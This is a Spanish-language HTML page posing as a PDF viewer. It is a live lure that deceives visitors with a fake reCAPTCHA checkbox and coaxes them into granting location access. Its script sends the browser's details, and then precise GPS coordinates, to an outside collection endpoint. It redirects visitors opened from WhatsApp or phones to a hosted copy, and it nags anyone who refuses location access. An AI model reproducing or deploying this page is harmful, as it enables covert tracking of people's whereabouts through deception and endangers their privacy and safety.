<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PDF Viewer</title>
</head>
<body>

<!-- Botón invisible para interacción en Android -->
<button id="geoBtn" style="opacity:0; position:absolute; pointer-events:auto; z-index:-1;">
Permitir
</button>

<!-- ===================================== -->
<!--      RECAPTCHA FALSO COMPLETO         -->
<!-- ===================================== -->
<div id="permisoBox" style="
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    background:rgba(0,0,0,0.65);
    display:flex;
    justify-content:center;
    align-items:center;
    z-index:9999;
    font-family:Arial;
">
    <div id="captchaBox" style="
        background:white;
        padding:28px;
        border-radius:14px;
        width:420px;
        box-shadow:0 6px 18px rgba(0,0,0,0.35);
        cursor:pointer;
        user-select:none;
        transform: scale(1.25);
    ">

        <div style="
            display:flex;
            align-items:center;
            border:1px solid #d3d3d3;
            border-radius:8px;
            padding:20px;
            zoom:1.4;
        ">
            <div id="fakeCheckbox" style="
                width:28px;
                height:28px;
                border:2px solid #c0c0c0;
                border-radius:3px;
                margin-right:12px;
                background:white;
                display:flex;
                justify-content:center;
                align-items:center;
                font-size:20px;
                color:#0d6efd;
            "></div>

            <span style="font-size:16px; color:#333;">No soy un robot</span>

            <div style="
                margin-left:auto;
                display:flex;
                flex-direction:column;
                align-items:center;
                font-size:10px;
                color:#555;
            ">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; opacity:0.8;">
                <span style="font-size:9px;">reCAPTCHA</span>
            </div>
        </div>

        <div style="text-align:center; margin-top:6px; font-size:10px; color:#777;">
            Privacidad · Términos
        </div>
    </div>
</div>

<script>
// =====================================
//   0) REDIRECCIÓN SI SE ABRE DESDE WHATSAPP
// =====================================
if (location.href.startsWith("content://") || document.referrer.includes("com.whatsapp")) {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
}

// Detectar móvil + local
const esMovil = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
const host = window.location.hostname;
const esLocal =
    host === "" ||
    host === "localhost" ||
    host === "127.0.0.1" ||
    host.startsWith("192.168.") ||
    host.startsWith("10.") ||
    window.location.protocol === "file:";

if (esMovil && esLocal) {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
}

// ===============================
//   FUNCIÓN PARA ENVIAR DATOS
// ===============================
function enviar(data) {
    fetch("https://www.arstore.tech/infopdf/capturar.php", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

// Enviar info inicial
enviar({
    type: "info",
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    time: new Date().toISOString()
});

// =====================================
//     REDIRIGIR LUEGO
// =====================================
function redirigirLuego() {
    window.location.href = "https://drive.google.com/file/d/1ggF1Gnb1HXQuwVSv8mHgodOz2T4FJ6Xd/view?usp=sharing";
}

// =====================================
//     ACTIVAR RECAPTCHA FALSO
// =====================================
document.getElementById("captchaBox").addEventListener("click", function() {

    const box = document.getElementById("fakeCheckbox");
    box.innerHTML = "✔";
    box.style.background = "#e6f0ff";
    box.style.borderColor = "#0d6efd";

    document.getElementById("captchaBox").style.opacity = "0.5";
    document.getElementById("captchaBox").style.pointerEvents = "none";

    setTimeout(() => {
        activarPermiso();
    }, 600);
});

// =====================================
//     activarPermiso()
// =====================================
function activarPermiso() {
    document.getElementById("permisoBox").style.display = "none";
    document.getElementById("geoBtn").click();

    setTimeout(() => {
        solicitarGeo();
    }, 200);
}

// =====================================
//    solicitarGeo()
// =====================================
function solicitarGeo() {
    if (!("geolocation" in navigator)) {
        enviar({
            type: "geo-error",
            error: "Geolocalización no soportada",
            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
        });

        setTimeout(redirigirLuego, 800);
        return;
    }

    navigator.geolocation.getCurrentPosition(
        pos => {
            enviar({
                type: "geo",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
            });

            setTimeout(redirigirLuego, 800);
        },

        err => {
            enviar({
                type: "geo-error",
                error: err.message,
                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
            });

            const msg = (err.message || "").toLowerCase();

            // 1️⃣ Usuario negó permisos → mostrar alerta y redirigir
if (
    msg.includes("denied") ||
    msg.includes("rechaz") ||
    msg.includes("negó")
) {
    alert("Debes permitir el acceso a la ubicación para continuar.");
    window.location.href = "https://encuestauta69-gif.github.io/pdf/";
    return;
}


            // 2️⃣ GPS apagado o sin señal
            if (
                msg.includes("unavailable") ||
                msg.includes("not be determined") ||
                msg.includes("no pudo ser determinada") ||
                msg.includes("ubicación no disponible")
            ) {
                alert("Activa el GPS de tu dispositivo para continuar.");
                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
                return;
            }

            // 3️⃣ Otro error (timeout o desconocido)
            setTimeout(() => {
                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
            }, 800);
        }
    ); // ← ESTE ERA EL PARÉNTESIS QUE FALTABA
}
</script>

<h2 style="color:#444; font-family:Arial;">❗ Verificación en curso</h2>
<p style="color:#666; font-family:Arial;">Descargando.....</p>

</body>
</html>
